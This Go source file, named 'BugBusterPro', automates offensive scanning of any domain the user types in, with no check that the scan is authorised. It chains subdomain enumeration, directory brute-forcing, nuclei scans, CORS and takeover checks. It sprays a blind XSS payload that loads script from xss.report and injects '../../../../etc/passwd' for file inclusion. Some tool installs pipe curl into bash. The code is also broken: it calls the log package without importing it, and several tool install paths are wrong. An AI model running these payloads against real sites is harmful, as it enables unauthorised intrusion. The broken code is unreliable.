package main

import (
	"bufio"
	"crypto/md5"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
	"math"
)

// Color codes for console output
const (
	colorReset  = "\033[0m"
	colorRed    = "\033[31m"
	colorGreen  = "\033[32m"
	colorYellow = "\033[33m"
	colorBlue   = "\033[34m"
)

// Configuration struct holds all command line parameters
type Config struct {
	Domain    string
	OutputDir string
	Force     bool
	Threads   int
	LogPath   string
}

// StepInfo struct for tracking step execution
type StepInfo struct {
	Name        string
	Description string
	Command     func(config Config) error
	OutputFile  string
}

// Global variables
var (
	requiredTools = []string{
		"subfinder", "httpx", "katana", "waybackurls", "otxurls",
		"feroxbuster", "nuclei", "corsy", "subzy", "qsreplace", "gf", "bxss",
	}
	errorLog *log.Logger
	infoLog  *log.Logger
)

// main function is the entry point
func main() {
	// Parse command line flags
	config := parseFlags()

	// Setup logging
	setupLogging(config)

	// Create required directories
	createDirectories(config)

	// Check and install required tools
	checkAndInstallTools()

	// Define all steps
	steps := defineSteps()

	// Execute all steps
	executeSteps(steps, config)

	printSuccess(fmt.Sprintf("BugBusterPro scan completed for domain: %s. Results saved to: %s", config.Domain, config.OutputDir))
}

// parseFlags parses command line arguments
func parseFlags() Config {
	var config Config

	flag.StringVar(&config.Domain, "domain", "", "Target domain to scan")
	flag.StringVar(&config.OutputDir, "output-dir", "output", "Directory to save results")
	flag.BoolVar(&config.Force, "force", false, "Force rerun all steps")
	flag.IntVar(&config.Threads, "threads", 200, "Number of threads to use")

	flag.Parse()

	// If domain is not provided, ask for it
	if config.Domain == "" {
		fmt.Print(colorBlue + "Write your target domain: " + colorReset)
		fmt.Scanln(&config.Domain)
		if config.Domain == "" {
			printError("Domain cannot be empty")
			os.Exit(1)
		}
	}

	// If output directory is not provided, ask for it
	if config.OutputDir == "output" {
		fmt.Print(colorBlue + "Pick folder to save outputs (default 'output'): " + colorReset)
		var outputDir string
		fmt.Scanln(&outputDir)
		if outputDir != "" {
			config.OutputDir = outputDir
		}
	}

	// If threads is default, ask if user wants to change it
	if config.Threads == 200 {
		fmt.Printf(colorBlue+"Choose thread number (default %d): "+colorReset, config.Threads)
		var threads string
		fmt.Scanln(&threads)
		if threads != "" {
			var err error
			config.Threads, err = parseThreads(threads)
			if err != nil {
				printError(fmt.Sprintf("Invalid thread count: %s. Using default: %d", threads, 200))
				config.Threads = 200
			}
		}
	}

	// Set log path
	config.LogPath = filepath.Join(config.OutputDir, "logs")

	return config
}

// parseThreads parses the thread count from user input
func parseThreads(input string) (int, error) {
	var threads int
	_, err := fmt.Sscanf(input, "%d", &threads)
	if err != nil || threads <= 0 {
		return 0, errors.New("invalid thread count")
	}
	return threads, nil
}

// setupLogging configures the loggers
func setupLogging(config Config) {
	// Create log directory if it doesn't exist
	err := os.MkdirAll(config.LogPath, 0755)
	if err != nil {
		printError(fmt.Sprintf("Failed to create log directory: %v", err))
		os.Exit(1)
	}

	// Setup error log
	errorLogFile, err := os.OpenFile(filepath.Join(config.LogPath, "error.log"), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		printError(fmt.Sprintf("Failed to open error log file: %v", err))
		os.Exit(1)
	}

	errorLog = log.New(errorLogFile, "ERROR: ", log.Ldate|log.Ltime|log.Lshortfile)

	// Setup info log
	infoLogFile, err := os.OpenFile(filepath.Join(config.LogPath, "info.log"), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		printError(fmt.Sprintf("Failed to open info log file: %v", err))
		os.Exit(1)
	}

	infoLog = log.New(io.MultiWriter(infoLogFile, os.Stdout), "INFO: ", log.Ldate|log.Ltime)
}

// createDirectories creates all required directories
func createDirectories(config Config) {
	directories := []string{
		filepath.Join(config.OutputDir, "subfinder"),
		filepath.Join(config.OutputDir, "httpx"),
		filepath.Join(config.OutputDir, "urls"),
		filepath.Join(config.OutputDir, "js"),
		filepath.Join(config.OutputDir, "findings"),
		filepath.Join(config.OutputDir, "logs"),
	}

	for _, dir := range directories {
		err := os.MkdirAll(dir, 0755)
		if err != nil {
			errorLog.Printf("Failed to create directory %s: %v", dir, err)
			printError(fmt.Sprintf("Failed to create directory %s: %v", dir, err))
			os.Exit(1)
		}
	}

	printSuccess("Created all required directories")
}

// checkAndInstallTools checks if required tools are installed and installs missing ones
func checkAndInstallTools() {
	var wg sync.WaitGroup
	toolChan := make(chan string, len(requiredTools))

	for _, tool := range requiredTools {
		toolChan <- tool
	}
	close(toolChan)

	concurrency := runtime.NumCPU()
	wg.Add(concurrency)

	for i := 0; i < concurrency; i++ {
		go func() {
			defer wg.Done()
			for tool := range toolChan {
				if !isToolInstalled(tool) {
					printInfo(fmt.Sprintf("Installing missing tool: %s", tool))
					if err := installTool(tool); err != nil {
						errorLog.Printf("Failed to install tool %s: %v", tool, err)
						printError(fmt.Sprintf("Failed to install tool %s: %v", tool, err))
					} else {
						printSuccess(fmt.Sprintf("Successfully installed tool: %s", tool))
					}
				} else {
					printInfo(fmt.Sprintf("Tool already installed: %s", tool))
				}
			}
		}()
	}

	wg.Wait()
	printSuccess("All required tools checked and installed if necessary")
}

// isToolInstalled checks if a tool is installed
func isToolInstalled(tool string) bool {
	_, err := exec.LookPath(tool)
	return err == nil
}

// installTool installs a specific tool
func installTool(tool string) error {
	var cmd *exec.Cmd

	switch tool {
	case "subfinder", "httpx", "katana", "waybackurls", "otxurls", "nuclei", "subzy", "qsreplace":
		cmd = exec.Command("go", "install", "-v", fmt.Sprintf("github.com/projectdiscovery/%s/cmd/%s@latest", tool, tool))
	case "feroxbuster":
		cmd = exec.Command("sh", "-c", "curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash")
	case "corsy":
		cmd = exec.Command("sh", "-c", "git clone https://github.com/s0md3v/Corsy.git /tmp/Corsy && pip3 install -r /tmp/Corsy/requirements.txt && sudo cp /tmp/Corsy/corsy.py /usr/local/bin/corsy.py && sudo chmod +x /usr/local/bin/corsy.py")
	case "gf":
		cmd = exec.Command("go", "install", "-v", "github.com/tomnomnom/gf@latest")
	case "bxss":
		cmd = exec.Command("go", "install", "-v", "github.com/ethicalhackingplayground/bxss@latest")
	default:
		return fmt.Errorf("unsupported tool: %s", tool)
	}

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

// defineSteps defines all scanning steps
func defineSteps() []StepInfo {
	return []StepInfo{
		{
			Name:        "Subdomain Discovery",
			Description: "Discovering subdomains using subfinder",
			Command:     runSubdomainDiscovery,
			OutputFile:  "subfinder/subdomains.txt",
		},
		{
			Name:        "Subdomain Probing",
			Description: "Probing alive subdomains using httpx",
			Command:     runSubdomainProbing,
			OutputFile:  "httpx/alive.txt",
		},
		{
			Name:        "URL Collection",
			Description: "Collecting URLs using katana, waybackurls, and otxurls",
			Command:     runURLCollection,
			OutputFile:  "urls/all.txt",
		},
		{
			Name:        "Secret Files Discovery",
			Description: "Discovering secret files",
			Command:     runSecretFilesDiscovery,
			OutputFile:  "findings/secrets.txt",
		},
		{
			Name:        "JavaScript Files",
			Description: "Analyzing JavaScript files",
			Command:     runJavaScriptFiles,
			OutputFile:  "findings/js_findings.txt",
		},
		{
			Name:        "Directory Bruteforce",
			Description: "Performing directory bruteforce using feroxbuster",
			Command:     runDirectoryBruteforce,
			OutputFile:  "urls/feroxbuster.txt",
		},
		{
			Name:        "XSS Scan",
			Description: "Scanning for XSS vulnerabilities",
			Command:     runXSSScan,
			OutputFile:  "findings/xss.txt",
		},
		{
			Name:        "Subdomain Takeover Check",
			Description: "Checking for subdomain takeover vulnerabilities",
			Command:     runSubdomainTakeoverCheck,
			OutputFile:  "findings/takeovers.txt",
		},
		{
			Name:        "CORS Scanner",
			Description: "Scanning for CORS misconfigurations",
			Command:     runCORSScanner,
			OutputFile:  "findings/cors.txt",
		},
		{
			Name:        "Misconfig/Exposure Scan",
			Description: "Scanning for misconfigurations and exposures",
			Command:     runMisconfigScan,
			OutputFile:  "findings/misconfigs.json",
		},
		{
			Name:        "CVEs & Tech Fingerprint",
			Description: "Scanning for CVEs and fingerprinting technology",
			Command:     runCVEScan,
			OutputFile:  "findings/nuclei_findings.json",
		},
		{
			Name:        "LFI Testing",
			Description: "Testing for Local File Inclusion vulnerabilities",
			Command:     runLFITesting,
			OutputFile:  "findings/lfi.json",
		},
	}
}

// executeSteps executes all steps
func executeSteps(steps []StepInfo, config Config) {
	for i, step := range steps {
		stepNum := i + 1
		outputFile := filepath.Join(config.OutputDir, step.OutputFile)

		printInfo(fmt.Sprintf("Step %d/%d: %s - %s", stepNum, len(steps), step.Name, step.Description))

		// Check if step needs to be rerun
		if !config.Force && isStepCompleted(outputFile) {
			printWarning(fmt.Sprintf("Step %d already completed. Skipping. Use --force to rerun.", stepNum))
			continue
		}

		// Execute step with retry logic
		if err := executeWithRetry(func() error {
			return step.Command(config)
		}, 3); err != nil {
			errorLog.Printf("Step %d failed after retries: %v", stepNum, err)
			printError(fmt.Sprintf("Step %d failed after retries: %v", stepNum, err))
		} else {
			printSuccess(fmt.Sprintf("Step %d completed successfully", stepNum))
		}
	}
}

// isStepCompleted checks if a step is already completed
func isStepCompleted(outputFile string) bool {
	_, err := os.Stat(outputFile)
	return err == nil
}

// executeWithRetry executes a function with retry logic
func executeWithRetry(f func() error, maxRetries int) error {
	var err error
	for retry := 0; retry < maxRetries; retry++ {
		if retry > 0 {
			backoffTime := math.Pow(2, float64(retry))
			printWarning(fmt.Sprintf("Retrying in %.0f seconds...", backoffTime))
			time.Sleep(time.Duration(backoffTime) * time.Second)
		}

		err = f()
		if err == nil {
			return nil
		}

		printError(fmt.Sprintf("Error: %v. Retry %d/%d", err, retry+1, maxRetries))
	}
	return err
}

// calculateFileHash calculates the MD5 hash of a file
func calculateFileHash(filePath string) (string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return "", err
	}
	defer file.Close()

	hash := md5.New()
	if _, err := io.Copy(hash, file); err != nil {
		return "", err
	}

	return hex.EncodeToString(hash.Sum(nil)), nil
}

// runShellCommand runs a shell command with the given arguments
func runShellCommand(name string, args ...string) error {
	cmd := exec.Command(name, args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

// runCommandToFile runs a command and writes its output to a file
func runCommandToFile(outputFile string, name string, args ...string) error {
	// Create directory if it doesn't exist
	dir := filepath.Dir(outputFile)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return err
	}

	// Open output file
	file, err := os.Create(outputFile)
	if err != nil {
		return err
	}
	defer file.Close()

	// Create and run command
	cmd := exec.Command(name, args...)
	cmd.Stdout = file
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

// runPipedCommands runs a sequence of piped commands
func runPipedCommands(commands [][]string, outputFile string) error {
	// Create directory if it doesn't exist
	dir := filepath.Dir(outputFile)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return err
	}

	// Build the command string
	var cmdStr strings.Builder
	for i, cmd := range commands {
		cmdStr.WriteString(strings.Join(cmd, " "))
		if i < len(commands)-1 {
			cmdStr.WriteString(" | ")
		}
	}
	cmdStr.WriteString(" > " + outputFile)

	// Execute the command
	cmd := exec.Command("bash", "-c", cmdStr.String())
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

// runSubdomainDiscovery runs the subdomain discovery step
func runSubdomainDiscovery(config Config) error {
	outputFile := filepath.Join(config.OutputDir, "subfinder/subdomains.txt")
	return runCommandToFile(outputFile, "subfinder", "-d", config.Domain, "-all", "-recursive")
}

// runSubdomainProbing runs the subdomain probing step
func runSubdomainProbing(config Config) error {
	inputFile := filepath.Join(config.OutputDir, "subfinder/subdomains.txt")
	outputFile := filepath.Join(config.OutputDir, "httpx/alive.txt")

	commands := [][]string{
		{"cat", inputFile},
		{"httpx", "-ports", "80,443,8000,8008,8888", "-threads", fmt.Sprintf("%d", config.Threads)},
	}

	return runPipedCommands(commands, outputFile)
}

// runURLCollection runs the URL collection step
func runURLCollection(config Config) error {
	// Run katana
	aliveFile := filepath.Join(config.OutputDir, "httpx/alive.txt")
	katanaOutput := filepath.Join(config.OutputDir, "urls/katana.txt")
	
	if err := runCommandToFile(katanaOutput, "katana", "-u", aliveFile, "-d", "5", "-jc", "-ef", "woff,css,svg,js,png,jpg,woff2,jpeg,gif"); err != nil {
		return err
	}

	// Run waybackurls
	waybackOutput := filepath.Join(config.OutputDir, "urls/wayback.txt")
	if err := runCommandToFile(waybackOutput, "waybackurls", "-list", aliveFile); err != nil {
		return err
	}

	// Run otxurls
	otxOutput := filepath.Join(config.OutputDir, "urls/otx.txt")
	if err := runCommandToFile(otxOutput, "otxurls", "-list", aliveFile); err != nil {
		return err
	}

	// Sort and deduplicate URLs
	urlsDir := filepath.Join(config.OutputDir, "urls")
	allURLs := filepath.Join(config.OutputDir, "urls/all.txt")
	
	return runShellCommand("sort", "-u", filepath.Join(urlsDir, "*.txt"), "-o", allURLs)
}

// runSecretFilesDiscovery runs the secret files discovery step
func runSecretFilesDiscovery(config Config) error {
	inputFile := filepath.Join(config.OutputDir, "urls/all.txt")
	outputFile := filepath.Join(config.OutputDir, "findings/secrets.txt")

	commands := [][]string{
		{"cat", inputFile},
		{"grep", "-E", "\\.txt|\\.log|\\.cache|\\.secret|\\.db|\\.backup|\\.yml|\\.json|\\.gz|\\.rar|\\.zip|\\.config"},
	}

	return runPipedCommands(commands, outputFile)
}

// runJavaScriptFiles runs the JavaScript files analysis step
func runJavaScriptFiles(config Config) error {
	inputFile := filepath.Join(config.OutputDir, "urls/all.txt")
	jsListFile := filepath.Join(config.OutputDir, "js/js.txt")
	jsFindingsFile := filepath.Join(config.OutputDir, "findings/js_findings.txt")
	jsKatanaFindingsFile := filepath.Join(config.OutputDir, "findings/js_katana_findings.txt")

	// Extract JS files
	commands1 := [][]string{
		{"cat", inputFile},
		{"grep", "-E", "\\.js$"},
	}
	if err := runPipedCommands(commands1, jsListFile); err != nil {
		return err
	}

	// Run nuclei on JS files
	commands2 := [][]string{
		{"cat", jsListFile},
		{"nuclei", "-t", "/opt/nuclei-templates/http/exposures/"},
	}
	if err := runPipedCommands(commands2, jsFindingsFile); err != nil {
		return err
	}

	// Run katana and nuclei on domain for JS files
	commands3 := [][]string{
		{"echo", config.Domain},
		{"katana", "-ps"},
		{"grep", "-E", "\\.js$"},
		{"nuclei", "-t", "/opt/nuclei-templates/http/exposures/", "-c", "30"},
	}
	return runPipedCommands(commands3, jsKatanaFindingsFile)
}

// runDirectoryBruteforce runs the directory bruteforce step
func runDirectoryBruteforce(config Config) error {
	inputFile := filepath.Join(config.OutputDir, "httpx/alive.txt")
	outputFile := filepath.Join(config.OutputDir, "urls/feroxbuster.txt")

	commands := [][]string{
		{"cat", inputFile},
		{"feroxbuster", "--stdin",
			"-w", "/snap/seclists/current/Discovery/Web-Content/raft-medium-directories.txt",
			"-x", "php,config,log,sql,bak,old,conf,backup,sub,db",
			"--depth", "3", "-t", "100", "-C", "404,403", "--redirects",
			"--user-agent", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
			"--auto-tune", "--scan-limit", "10", "--no-recursion",
			"--collect-backups", "--collect-extensions"},
	}

	return runPipedCommands(commands, outputFile)
}

// runXSSScan runs the XSS scanning step
func runXSSScan(config Config) error {
	outputFile := filepath.Join(config.OutputDir, "findings/xss.txt")

	commands := [][]string{
		{"subfinder", "-d", config.Domain},
		{"httpx", "-silent", "-ports", "80,443,8080,8443"},
		{"katana", "-f", "qurl", "-jc"},
		{"gf", "xss"},
		{"bxss", "-a", "-p", "<script/src=//xss.report/c/coffinpx></script>", "-t", "-c", "50"},
	}

	return runPipedCommands(commands, outputFile)
}

// runSubdomainTakeoverCheck runs the subdomain takeover check step
func runSubdomainTakeoverCheck(config Config) error {
	inputFile := filepath.Join(config.OutputDir, "subfinder/subdomains.txt")
	outputFile := filepath.Join(config.OutputDir, "findings/takeovers.txt")

	return runCommandToFile(outputFile, "subzy", "run", "--targets", inputFile, "--concurrency", "100", "--hide_fails", "--verify_ssl")
}

// runCORSScanner runs the CORS scanner step
func runCORSScanner(config Config) error {
	inputFile := filepath.Join(config.OutputDir, "httpx/alive.txt")
	outputFile := filepath.Join(config.OutputDir, "findings/cors.txt")

	return runCommandToFile(outputFile, "python3", "corsy.py", "-i", inputFile, "-t", "10", "--headers", "User-Agent: GoogleBot\nCookie: SESSION=Hacked")
}

// runMisconfigScan runs the misconfiguration scan step
func runMisconfigScan(config Config) error {
	inputFile := filepath.Join(config.OutputDir, "httpx/alive.txt")
	outputFile := filepath.Join(config.OutputDir, "findings/misconfigs.json")

	return runCommandToFile(outputFile, "nuclei", "-l", inputFile,
		"-t", "/opt/nuclei-templates/",
		"-tags", "cors,misconfig",
		"-rate-limit", "150", "-c", "50", "-mhe", "50", "-timeout", "15",
		"-iserver", "https://your-interactsh-server.com",
		"-severity", "medium,high,critical",
		"-j", "-stats", "-irr", "-validate")
}

// runCVEScan runs the CVE scanning step
func runCVEScan(config Config) error {
	inputFile := filepath.Join(config.OutputDir, "httpx/alive.txt")
	outputFile := filepath.Join(config.OutputDir, "findings/nuclei_findings.json")

	return runCommandToFile(outputFile, "nuclei", "-list", inputFile, "-tags", "cve,osint,tech")
}

// runLFITesting runs the LFI testing step
func runLFITesting(config Config) error {
	inputFile := filepath.Join(config.OutputDir, "urls/all.txt")
	outputFile := filepath.Join(config.OutputDir, "findings/lfi.json")

	commands := [][]string{
		{"cat", inputFile},
		{"grep", "-E", "\\.php\\?|\\.asp\\?|\\.jsp\\?|file=|page="},
		{"qsreplace", "../../../../etc/passwd"},
		{"nuclei", "-t", "/opt/nuclei-templates/vulnerabilities/",
			"-tags", "lfi,file-inclusion", "-headless", "-system-chrome",
			"-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
			"-rate-limit", "50", "-c", "30", "-timeout", "10",
			"-severity", "medium,high,critical", "-irr", "-j"},
	}

	return runPipedCommands(commands, outputFile)
}

// printSuccess prints a success message
func printSuccess(message string) {
	fmt.Printf("%s✓ %s%s\n", colorGreen, message, colorReset)
	infoLog.Println(message)
}

// printError prints an error message
func printError(message string) {
	fmt.Printf("%s✗ %s%s\n", colorRed, message, colorReset)
	errorLog.Println(message)
}

// printWarning prints a warning message
func printWarning(message string) {
	fmt.Printf("%s! %s%s\n", colorYellow, message, colorReset)
	infoLog.Println("WARNING: " + message)
}

// printInfo prints an information message
func printInfo(message string) {
	fmt.Printf("%s→ %s%s\n", colorBlue, message, colorReset)
	infoLog.Println(message)
}
